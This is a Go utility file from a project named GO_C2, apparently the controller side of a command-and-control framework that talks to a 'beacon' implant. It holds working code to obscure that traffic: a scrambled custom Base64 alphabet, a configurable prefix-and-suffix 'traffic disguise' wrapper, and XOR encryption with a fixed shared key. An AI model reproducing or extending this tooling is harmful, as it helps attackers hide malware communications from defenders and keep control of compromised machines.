package utils

import (
    "encoding/base64"
    "encoding/json"
    "strings"

    "GO_C2/config"
)

const standardBase64Table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

func GetCustomBase64Table() string {
    // 强制使用与beacon端相同的Base64编码表，确保一致性
    return "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789+/"
}

func IsCustomBase64Enabled() bool { return config.GlobalConfig != nil && config.GlobalConfig.Encoding.UseCustomBase64 }

func CustomBase64Encode(data []byte) string { return CustomBase64EncodeWithTable(data, GetCustomBase64Table()) }

func CustomBase64EncodeWithTable(data []byte, table string) string {
    if len(data) == 0 { return "" }
    if len(table) != 64 { table = standardBase64Table }
    var sb strings.Builder
    for i := 0; i < len(data); i += 3 {
        var b1, b2, b3 byte
        b1 = data[i]
        if i+1 < len(data) { b2 = data[i+1] }
        if i+2 < len(data) { b3 = data[i+2] }
        val1 := b1 >> 2
        val2 := ((b1 & 0x03) << 4) | (b2 >> 4)
        val3 := ((b2 & 0x0F) << 2) | (b3 >> 6)
        val4 := b3 & 0x3F
        sb.WriteByte(table[val1])
        sb.WriteByte(table[val2])
        if i+1 < len(data) { sb.WriteByte(table[val3]) } else { sb.WriteByte('=') }
        if i+2 < len(data) { sb.WriteByte(table[val4]) } else { sb.WriteByte('=') }
    }
    return sb.String()
}

func CustomBase64Decode(input string) ([]byte, error) { return CustomBase64DecodeWithTable(input, GetCustomBase64Table()) }

func CustomBase64DecodeWithTable(input string, table string) ([]byte, error) {
    if len(input) == 0 { return nil, nil }
    if len(input)%4 != 0 { return nil, base64.CorruptInputError(len(input)) }
    if len(table) != 64 { table = standardBase64Table }
    padding := 0
    if len(input) > 0 && input[len(input)-1] == '=' { padding++ }
    if len(input) > 1 && input[len(input)-2] == '=' { padding++ }
    outputLen := (len(input)/4)*3 - padding
    output := make([]byte, outputLen)
    j := 0
    for i := 0; i < len(input); i += 4 {
        var val uint32
        for k := 0; k < 4; k++ {
            c := input[i+k]
            var digit int
            if c == '=' { digit = 0 } else {
                digit = strings.IndexByte(table, c)
                if digit == -1 { return nil, base64.CorruptInputError(i + k) }
            }
            val = (val << 6) | uint32(digit)
        }
        if j < len(output) { output[j] = byte(val >> 16); j++ }
        if j < len(output) { output[j] = byte(val >> 8); j++ }
        if j < len(output) { output[j] = byte(val); j++ }
    }
    return output, nil
}

func EncodeBase64(data interface{}) (string, error) {
    jsonData, err := json.Marshal(data)
    if err != nil { return "", err }
    return base64.StdEncoding.EncodeToString(jsonData), nil
}

func DecodeBase64(str string, v interface{}) error {
    data, err := base64.StdEncoding.DecodeString(str)
    if err != nil { return err }
    return json.Unmarshal(data, v)
}

func WrapDataWithDisguise(data string) string {
    if config.GlobalConfig == nil || !config.GlobalConfig.TrafficDisguise.Enable { return data }
    return config.GlobalConfig.TrafficDisguise.Prefix + data + config.GlobalConfig.TrafficDisguise.Suffix
}

func UnwrapDataFromDisguise(wrappedData string) string {
    if config.GlobalConfig == nil || !config.GlobalConfig.TrafficDisguise.Enable { return wrappedData }
    prefix := config.GlobalConfig.TrafficDisguise.Prefix
    suffix := config.GlobalConfig.TrafficDisguise.Suffix
    if len(wrappedData) < len(prefix)+len(suffix) { return wrappedData }
    if !strings.HasPrefix(wrappedData, prefix) { return wrappedData }
    if !strings.HasSuffix(wrappedData, suffix) { return wrappedData }
    return wrappedData[len(prefix):len(wrappedData)-len(suffix)]
}

func IsTrafficDisguiseEnabled() bool { return config.GlobalConfig != nil && config.GlobalConfig.TrafficDisguise.Enable }

// XOREncryptDecrypt 使用XOR密钥加密/解密数据（加密和解密使用相同操作）
// 密钥与beacon端的XOR_FIXED_KEY保持一致，默认为"CHANGE_ME_FIXED_KEY"
func XOREncryptDecrypt(data []byte, key string) []byte {
	if len(data) == 0 || len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	keyBytes := []byte(key)
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ keyBytes[i%len(keyBytes)]
	}
	return result
}

// GetXORKey 获取XOR加密密钥，与beacon端保持一致
func GetXORKey() string {
	// 与beacon/config.h中的XOR_FIXED_KEY保持一致
	return "CHANGE_ME_FIXED_KEY"
}


